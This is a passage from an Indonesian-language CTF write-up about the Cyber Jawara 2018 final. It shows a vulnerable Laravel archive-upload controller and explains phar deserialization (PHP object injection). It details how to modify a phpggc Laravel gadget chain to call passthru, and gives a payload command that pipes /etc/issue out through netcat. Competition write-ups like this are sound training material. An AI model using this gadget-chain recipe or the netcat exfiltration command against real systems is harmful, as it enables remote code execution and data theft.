class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">User</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MainController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $dir_name = <span class="string">'/tmp/'</span> . $request-&gt;session()-&gt;getId();</span><br><span class="line">        <span class="keyword">if</span> (file_exists($dir_name)) &#123;</span><br><span class="line">            $files = glob($dir_name . <span class="string">'/*'</span>);</span><br><span class="line">            $checked = <span class="keyword">array</span>(<span class="string">"c"</span>, <span class="string">"cpp"</span>, <span class="string">"py"</span>, <span class="string">"sh"</span>);</span><br><span class="line">            $result = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">foreach</span> ($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">                <span class="keyword">if</span> (is_file($file)) &#123;</span><br><span class="line">                    $exp = explode(<span class="string">'.'</span>, $file);</span><br><span class="line">                    $extension = end($exp);</span><br><span class="line">                    $exp = explode(<span class="string">'/'</span>, $file);</span><br><span class="line">                    $filename = end($exp);</span><br><span class="line">                    <span class="keyword">if</span> (in_array($extension, $checked)) &#123;</span><br><span class="line">                        $content = file_get_contents($file);</span><br><span class="line">                        $result[$filename] = sha1($content);                        </span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> view(<span class="string">'main'</span>, [<span class="string">'result'</span> =&gt; $result]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> view(<span class="string">'main'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($request-&gt;hasFile(<span class="string">'file'</span>)) &#123;</span><br><span class="line">            $dir_name = <span class="string">'/tmp/'</span> . $request-&gt;session()-&gt;getId();</span><br><span class="line">            <span class="keyword">if</span> (!file_exists($dir_name)) &#123;</span><br><span class="line">                mkdir($dir_name);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $files = glob($dir_name . <span class="string">'/*'</span>);</span><br><span class="line">                <span class="keyword">foreach</span> ($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (is_file($file)) &#123;</span><br><span class="line">                        unlink($file);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $file = request()-&gt;file(<span class="string">'file'</span>);</span><br><span class="line">            $extension = $file-&gt;getClientOriginalExtension();</span><br><span class="line"></span><br><span class="line">            $allowed = <span class="keyword">array</span>(<span class="string">"tar"</span>, <span class="string">"zip"</span>, <span class="string">"phar"</span>);</span><br><span class="line">            <span class="keyword">if</span> (in_array($extension, $allowed)) &#123;</span><br><span class="line">                $name = $file-&gt;getClientOriginalName();</span><br><span class="line">                $file-&gt;move($dir_name . <span class="string">'/'</span>, $name);</span><br><span class="line">                $path = $dir_name . <span class="string">'/'</span> . $name;</span><br><span class="line"></span><br><span class="line">                $archive = <span class="keyword">NULL</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    $archive = <span class="keyword">new</span> \Phar($path);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (\<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        $archive = <span class="keyword">new</span> \PharData($path);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (\<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">                        <span class="comment">// pass</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> ($archive) &#123;</span><br><span class="line">                    $archive-&gt;extractTo($dir_name);</span><br><span class="line">                    $checked = <span class="keyword">array</span>(<span class="string">"c"</span>, <span class="string">"cpp"</span>, <span class="string">"py"</span>, <span class="string">"sh"</span>);</span><br><span class="line">                    $result = <span class="keyword">array</span>();</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="keyword">new</span> \RecursiveIteratorIterator($archive) <span class="keyword">as</span> $submission) &#123;</span><br><span class="line">                        $exp = explode(<span class="string">'.'</span>, $submission);</span><br><span class="line">                        $extension = end($exp);</span><br><span class="line">                        $exp = explode(<span class="string">'/'</span>, $submission);</span><br><span class="line">                        $filename = end($exp);</span><br><span class="line">                        <span class="keyword">if</span> (in_array($extension, $checked)) &#123;</span><br><span class="line">                            $content = file_get_contents($submission);</span><br><span class="line">                            $result[$filename] = sha1($content);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> view(<span class="string">'main'</span>, [<span class="string">'result'</span> =&gt; $result]);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> view(<span class="string">'main'</span>, [<span class="string">'error'</span> =&gt; <span class="string">"Invalid Archive"</span>]);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> view(<span class="string">'main'</span>, [<span class="string">'error'</span> =&gt; <span class="string">"Invalid Archive"</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> view(<span class="string">'main'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>Intended solution dari challenge ini adalah memanfaatkan bug <code>PHP Object Injection</code> melalui <code>unserialize</code> dari <code>phar</code>. Sehingga dapat dilakukan <code>unserialize</code> tanpa fungsi <code>unserialize()</code></p>
<p>Terdapat code yang dimodif yaitu di <code>vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php</code> (Code ini penting, karena untuk membuat <code>POP gadget</code>)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Contracts</span>\<span class="title">Events</span>\<span class="title">Dispatcher</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PendingBroadcast</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The event dispatcher implementation.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> \Illuminate\Contracts\Events\Dispatcher</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $laravel_events; <span class="comment">// Original : $events</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The event instance.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $laravel_event; <span class="comment">// Original : $event</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a new pending broadcast instance.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  \Illuminate\Contracts\Events\Dispatcher  $events</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  mixed  $event</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(Dispatcher $events, $event)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;laravel_event = $event;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;laravel_events = $events;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Broadcast the event to everyone except the current user.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> $this</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toOthers</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (method_exists(<span class="keyword">$this</span>-&gt;laravel_event, <span class="string">'dontBroadcastToCurrentUser'</span>)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;laravel_event-&gt;dontBroadcastToCurrentUser();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Handle the object's destruction.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;laravel_events-&gt;dispatch(<span class="keyword">$this</span>-&gt;laravel_event);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Untuk menggenerate payload nya bisa menggunakan <code>phpgcc</code>, dengan catatan pada <code>gadgetchains/Laravel/RCE/1/gadget.php</code></p>
<p>Source asli<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> $events;</span><br><span class="line"><span class="keyword">protected</span> $event;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events, $cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;event = $cmd;</span><br><span class="line">&#125;</span><br><span class="line">....</span><br><span class="line"><span class="keyword">protected</span> $formatters = [</span><br><span class="line">    <span class="string">'dispatch'</span> =&gt; <span class="string">'assert'</span></span><br><span class="line">];</span><br><span class="line">....</span><br></pre></td></tr></table></figure></p>
<p>Ubah mengikuti code yang di modif di file <code>vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php</code><br>Sehingga menjadi<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> $laravel_events;</span><br><span class="line"><span class="keyword">protected</span> $laravel_event;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events, $cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;laravel_events = $events;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;laravel_event = $cmd;</span><br><span class="line">&#125;</span><br><span class="line">....</span><br><span class="line"><span class="keyword">protected</span> $formatters = [</span><br><span class="line">    <span class="string">'dispatch'</span> =&gt; <span class="string">'passthru'</span></span><br><span class="line">];</span><br><span class="line">....</span><br></pre></td></tr></table></figure></p>
<p>Lalu generate payload dan upload ke web.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./pharggc LARAVEL/RCE1 <span class="string">"cat /etc/issue | nc 127.0.0.1 2121"</span></span><br><span class="line">Payload written to: out.phar</span><br></pre></td></tr></table></figure></p>
<h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><p>Terdapat lebih dari satu <strong>Vulnerability</strong> pada service-service yang diberikan. Write up ini berdasarkan <strong>Vulnerability</strong> yang kami gunakan saat event berlangsung.<br>Bagi yang ingin mencoba service-service nya dapat melihat di repo : <a href="https://github.com/farisv/CJ2018-Final-CTF" target="_blank" rel="noopener">https://github.com/farisv/CJ2018-Final-CTF</a></p>

  </div>
</article>



    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/posts/">Writing</a></li>
         
          <li><a href="http://github.com/rhamaa">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#P03-Image-Manipulator"><span class="toc-number">1.</span> <span class="toc-text">P03 - Image Manipulator</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#P04-Code-Runner"><span class="toc-number">2.</span> <span class="toc-text">P04 - Code Runner</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#P07-Exif-Reader"><span class="toc-number">3.</span> <span class="toc-text">P07 - Exif Reader</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#P08-Hackme"><span class="toc-number">4.</span> <span class="toc-text">P08 - Hackme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#P10-Assignment-Solved-After-Competition"><span class="toc-number">5.</span> <span class="toc-text">P10 - Assignment (Solved After Competition)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Note"><span class="toc-number">6.</span> <span class="toc-text">Note</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://rhama.my.id/2018/10/17/Cyber-Jawara-2018-Final-Web-Exploitation/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://rhama.my.id/2018/10/17/Cyber-Jawara-2018-Final-Web-Exploitation/&text=Cyber Jawara 2018 Final - Web Exploitation"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://rhama.my.id/2018/10/17/Cyber-Jawara-2018-Final-Web-Exploitation/&title=Cyber Jawara 2018 Final - Web Exploitation"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://rhama.my.id/2018/10/17/Cyber-Jawara-2018-Final-Web-Exploitation/&is_video=false&description=Cyber Jawara 2018 Final - Web Exploitation"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Cyber Jawara 2018 Final - Web Exploitation&body=Check out this article: http://rhama.my.id/2018/10/17/Cyber-Jawara-2018-Final-Web-Exploitation/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://rhama.my.id/2018/10/17/Cyber-Jawara-2018-Final-Web-Exploitation/&title=Cyber Jawara 2018 Final - Web Exploitation"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://rhama.my.id/2018/10/17/Cyber-Jawara-2018-Final-Web-Exploitation/&title=Cyber Jawara 2018 Final - Web Exploitation"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://rhama.my.id/2018/10/17/Cyber-Jawara-2018-Final-Web-Exploitation/&title=Cyber Jawara 2018 Final - Web Exploitation"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://rhama.my.id/2018/10/17/Cyber-Jawara-2018-Final-Web-Exploitation/&title=Cyber Jawara 2018 Final - Web Exploitation"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://rhama.my.id/2018/10/17/Cyber-Jawara-2018-Final-Web-Exploitation/&name=Cyber Jawara 2018 Final - Web Exploitation&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
      <ul>
        <li id="toc"><a class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
        <li id="share"><a class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
        <li id="menu"><a class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
      </ul>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2018 rhama
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/posts/">Writing</a></li>
         
          <li><a href="http://github.com/rhamaa">Projects</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

</body>
</html>
<!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">

<!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>


    <!-- Google Analytics -->
    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-37473492-6', 'auto');
        ga('send', 'pageview');
    </script>



